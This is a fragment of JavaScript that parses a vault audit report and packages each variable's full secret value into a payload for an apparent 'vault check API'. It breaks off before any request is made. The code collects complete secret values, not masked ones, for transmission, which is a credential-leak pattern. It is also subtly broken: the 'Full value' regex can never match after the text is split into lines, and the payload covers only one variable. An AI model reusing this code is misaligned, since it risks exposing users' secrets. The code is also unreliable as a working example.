// Parse vault-audit.txt into JSON
const lines = content.split('\n');
const data = {};

for (let line of lines) {
  if (line.startsWith('Variable: ')) {
    data.variable = line.replace('Variable: ', '').trim();
  } else if (line.startsWith('First 8 characters: ')) {
    data.first8Chars = line.replace('First 8 characters: ', '').trim();
  } else if (line.startsWith('Full value:')) {
    const values = line.match(/^Full value:\s*([^\n]+)\n/);
    if (values) data.fullValue = values[1].trim();
  } else if (line.startsWith('Format validation:')) {
    const status = line.match(/✓/);
    data.isValid = status ? true : false;
    data.validationMessage = line.replace('Format validation:', '').trim();
  } else if (line.startsWith('Total variables reviewed:')) {
    data.totalReviewed = line.split(':')[1].trim();
  } else if (line.startsWith('Valid format:')) {
    data.validCount = line.split(':')[1].trim();
  } else if (line.startsWith('Invalid format:')) {
    data.invalidCount = line.split(':')[1].trim();
  }
}

// Prepare payload for vault check API
const payload = {
  sourceFile: 'vault-audit.txt',
  variables: [data.variable].filter(Boolean).map((varName, i) => {
    const dv = lines.filter(l => l.startsWith('Variable: '));
    const first8 = lines.filter(l => l.startsWith('First 8 characters: '));
    const full = lines.filter(l => l.startsWith('Full value:'));
    const format = lines.filter(l => l.startsWith('Format validation:'));
    return {
      variable: dv[i]?.replace('Variable: ', '').trim() || '',
      first8Chars: first8[i]?.replace('First 8 characters: ', '').trim() || '',
      fullValue: full[i]?.replace('Full value:', '').trim() || '',
      isValid: !!format[i]?.match(/✓/),
      validationMessage: format[i]?.replace('Format validation:', '').trim() || ''
    };
